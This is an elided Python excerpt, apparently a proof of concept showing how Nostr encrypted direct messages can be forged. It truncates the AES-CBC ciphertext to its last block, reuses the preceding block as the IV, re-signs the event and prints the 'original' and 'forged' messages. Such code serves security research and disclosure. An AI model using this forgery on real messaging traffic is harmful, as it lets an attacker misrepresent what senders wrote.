...
def truncate_ciphertext(content:str):
  ciphertext, iv = content.split('?iv=')
  c_raw = base64.b64decode(ciphertext)
  iv = base64.b64encode(c_raw[len(c_raw)-32:len(c_raw)-16]).decode('utf-8')
  return base64.b64encode(c_raw[len(c_raw)-16:len(c_raw)]).decode('utf-8') + '?iv=' + iv
...
dm = EncryptedDirectMessage(
  ...
  cleartext_content="1-23456789abcdefe"
)
...
print('original dm')
print(dm.content)
dm.content = truncate_ciphertext(dm.content)
nostr_key.sign_event(dm)
print('forged dm')
print(dm.content)
print('---')
...
# replace content with after sign (invalid sig)
#dm.content = ""
